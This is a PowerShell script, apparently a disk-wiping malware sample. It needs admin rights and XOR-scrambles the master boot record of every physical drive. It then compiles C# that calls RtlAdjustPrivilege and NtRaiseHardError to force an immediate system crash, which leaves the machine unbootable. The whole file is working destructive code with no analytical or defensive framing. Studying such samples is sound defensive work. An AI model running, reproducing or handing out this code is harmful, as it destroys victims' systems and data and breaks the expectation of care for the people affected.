# Check if the script is running as admin
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
if (-not $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "This script must be run as Admin to encrypt the MBR."
    return
}

# Get all physical drives using CIM
$drives = Get-CimInstance -ClassName Win32_DiskDrive

# XOR encryption key
$key = 0x55
$mbrOverwritten = $false

foreach ($drive in $drives) {
    $diskPath = "\\.\" + $drive.DeviceID
    
    try {
        # Open the disk for reading and writing
        $fs = [IO.File]::Open($diskPath, [IO.FileMode]::Open, [IO.FileAccess]::ReadWrite)

        # Read the first 512 bytes (MBR)
        $mbr = New-Object byte[] 512
        if ($fs.Read($mbr, 0, 512) -ne 512) {
            throw "Failed to read full MBR."
        }

        # XOR encrypt the MBR excluding the last 2 bytes (signature)
        for ($i = 0; $i -lt 510; $i++) {
            $mbr[$i] = $mbr[$i] -bxor $key
        }

        # Write the modified MBR back to the disk
        $fs.Seek(0, [IO.SeekOrigin]::Begin)
        $fs.Write($mbr, 0, 512)

        # Mark that at least one MBR was successfully overwritten
        $mbrOverwritten = $true
        Write-Host "Successfully encrypted MBR on $diskPath"

    } catch {
        Write-Host "Failed to process $diskPath - $_"
    } finally {
        # Close the file stream
        if ($fs) { $fs.Dispose() }
    }
}

# Only execute Add-Type if at least one MBR was modified
if ($mbrOverwritten) {

$src = @"
using System;
using System.Runtime.InteropServices;

public static class Program {

    [DllImport("ntdll")]
    private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

    [DllImport("ntdll")]
    private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

    public static void Main() {

        bool PreviousValue; 
	uint Response;
        RtlAdjustPrivilege(19, true, false, out PreviousValue);
        NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out Response);

    }
}
"@

Add-Type $src

[Program]::Main()

}
